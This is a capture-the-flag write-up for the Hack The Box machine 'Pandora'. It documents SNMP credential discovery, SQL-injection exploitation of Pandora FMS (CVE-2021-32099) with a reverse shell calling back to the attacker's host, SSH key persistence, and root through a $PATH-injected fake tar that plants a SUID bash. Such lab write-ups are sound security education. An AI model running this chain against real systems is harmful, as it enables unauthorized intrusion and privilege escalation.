# Target
| Category          | Details                                                |
|-------------------|--------------------------------------------------------|
| 📝 **Name**       | [Pandora](https://app.hackthebox.com/machines/Pandora) |  
| 🏷 **Type**       | HTB Machine                                            |
| 🖥 **OS**         | Linux                                                  |
| 🎯 **Difficulty** | Easy                                                   |
| 📁 **Tags**       | SNMP, Pandora FMS, CVE-2021-32099, $PATH injection     |

# Scan

## TCP
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Play | Landing
|_http-server-header: Apache/2.4.41 (Ubuntu)
```

## UDP
```
161/udp open   snmp
```

# Attack path
1. [Gain initial foothold using credentials discovered in processes list obtained with `snmp-check`](#gain-initial-foothold-using-credentials-discovered-in-processes-list-obtained-with-snmp-check)
2. [Escalate to `matt` user using SQL injection in Pandora FMS v7.0NG.742 (CVE-2021-32099)](#escalate-to-matt-user-using-sql-injection-in-pandora-fms-v70ng742-cve-2021-32099)
3. [Escalate to `root` user using $PATH injection vulnerability in backup script](#escalate-to-root-user-using-path-injection-vulnerability-in-backup-script)

### Gain initial foothold using credentials discovered in processes list obtained with `snmp-check`

#### Enumerate target using open SNMP port with `snmp-check`
```
┌──(magicrc㉿perun)-[~/attack/HTB Pandora]
└─$ snmp-check $TARGET
<SNIP>
[*] Processes:
<SNIP>
  1009                  runnable              sh                    /bin/sh               -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
<SNIP>
```

#### Use discovered credentials to gain access over SSH
```
┌──(magicrc㉿perun)-[~/attack/HTB Pandora]
└─$ ssh daniel@$TARGET
daniel@10.129.250.91's password: 
<SNIP>
daniel@pandora:~$ id
uid=1001(daniel) gid=1001(daniel) groups=1001(daniel)
```

### Escalate to `matt` user using SQL injection in Pandora FMS v7.0NG.742 ([CVE-2021-32099](https://nvd.nist.gov/vuln/detail/CVE-2021-32099))

#### Discover Pandora FMS v7.0NG.742 running on localhost as `matt` user
```
daniel@pandora:~$ cat /etc/apache2/sites-enabled/pandora.conf 
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

#### Setup SSH tunnel to local Pandora FMS port using discovered credentials
```
┌──(magicrc㉿perun)-[~/attack/HTB Pandora]
└─$ ssh -L 80:localhost:80 -Nf daniel@$TARGET
daniel@10.129.183.198's password:
```

#### Exploit CVE-2021-32099 to gain initial foothold using reverse shell connection
```
LHOST=$(ip addr show tun0 | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
LPORT=4444
git clone https://github.com/magicrc/CVE-2021-32099.git -q && cd CVE-2021-32099 && \
python3 -m venv .venv && source .venv/bin/activate && pip install -r requirements.txt && \
python3 ./CVE-2021-32099.py --target http://localhost --lhost $LHOST --lport $LPORT
<SNIP>
[+] Bypassing authentication...OK
[+] Uploading reverse shell...OK
[+] Trying to bind to :: on port 4444: Done
[+] Waiting for connections on :::4444: Got connection from ::ffff:10.129.175.14 on port 55234
[+] Executing reverse shell...
[*] Switching to interactive mode
Linux pandora 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 07:42:51 up 12 min,  0 users,  load average: 0.08, 0.04, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(matt) gid=1000(matt) groups=1000(matt)
/bin/sh: 0: can't access tty; job control turned off
$  
```

#### Upgrade reverse shell connection to SSH using private key
```
$ ssh-keygen -t rsa -b 4096 -f /home/matt/.ssh/id_rsa -N "" && \
cat /home/matt/.ssh/id_rsa.pub >> /home/matt/.ssh/authorized_keys && \
chmod 700 /home/matt/.ssh && chmod 600 /home/matt/.ssh/* &&
cat /home/matt/.ssh/id_rsa
Generating public/private rsa key pair.
Created directory '/home/matt/.ssh'.
Your identification has been saved in /home/matt/.ssh/id_rsa
Your public key has been saved in /home/matt/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:rfQQX/UWoXC2Wlxzxv+E+Cg30yS6WhWKNkF7cqV5lZk matt@pandora
The key's randomart image is:
+---[RSA 4096]----+
|        .  ..ooX+|
|       . . +=oEo=|
|        = = +* .+|
|         X +=.o.o|
|        S +o.* ..|
|       o =o.= o .|
|        . o+ o   |
|         ..      |
|        ..       |
+----[SHA256]-----+
-----BEGIN OPENSSH PRIVATE KEY-----
<SNIP>
-----END OPENSSH PRIVATE KEY-----
```

Copy & paste generated key to attack machine and use it to connect.
```
┌──(magicrc㉿perun)-[~/attack/HTB Pandora]
└─$ chmod 600 id_rsa && ssh matt@$TARGET -i id_rsa 
<SNIP>
matt@pandora:~$ id
uid=1000(matt) gid=1000(matt) groups=1000(matt)
```

### Escalate to `root` user using $PATH injection vulnerability in backup script

#### Locate binary with SUID flag
Binary has been found with `linpeas`.
```
$ ls -l /usr/bin/pandora_backup
-rwsr-x--- 1 root matt 16816 Dec  3  2021 /usr/bin/pandora_backup
```

#### Exfiltrate binary to analyze its code
```
┌──(magicrc㉿perun)-[~/attack/HTB Pandora]
└─$ scp -i id_rsa matt@$TARGET:/usr/bin/pandora_backup .
```

#### Analyze binary using `binaryninja`
![Binary Ninja analysis](images/binaryninja_pandora_backup.png)

Analysis shows that relative path to `tar` is being used, and thus we could inject its malicious version on $PATH.
```
system("tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*")
```

#### Spawn root shell with malicious `tar` injected into $PATH 
```
matt@pandora:~$ echo "/bin/cp /bin/bash /tmp/root_shell && /bin/chmod +s /tmp/root_shell" > /home/matt/tar && \
chmod +x /home/matt/tar && \
PATH=/home/matt:$PATH && \
/usr/bin/pandora_backup && \
/tmp/root_shell -p
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup successful!
Terminating program!
root_shell-5.0# id
uid=1000(matt) gid=1000(matt) euid=0(root) groups=1000(matt)
```